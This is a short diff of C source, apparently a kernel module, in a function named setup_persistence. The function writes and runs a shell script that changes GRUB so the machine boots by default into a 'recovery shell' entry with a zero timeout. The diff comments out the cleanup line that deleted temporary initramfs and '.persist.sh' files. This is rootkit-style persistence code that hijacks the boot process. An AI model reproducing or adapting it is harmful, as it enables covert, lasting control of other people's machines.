@@ -73,8 +73,8 @@ static void setup_persistence(void) {
         "update-grub\n"
         "grub-set-default 'Ubuntu (recovery shell)'\n"
         "sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=0/' /etc/default/grub\n"
-        "update-grub\n"
-        "rm -rf /tmp/custom_initramfs /tmp/.persist.sh\n";
+        "update-grub\n";
+        //"rm -rf /tmp/custom_initramfs /tmp/.persist.sh\n";
 
     fp = filp_open(script_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
     if (!IS_ERR(fp)) {
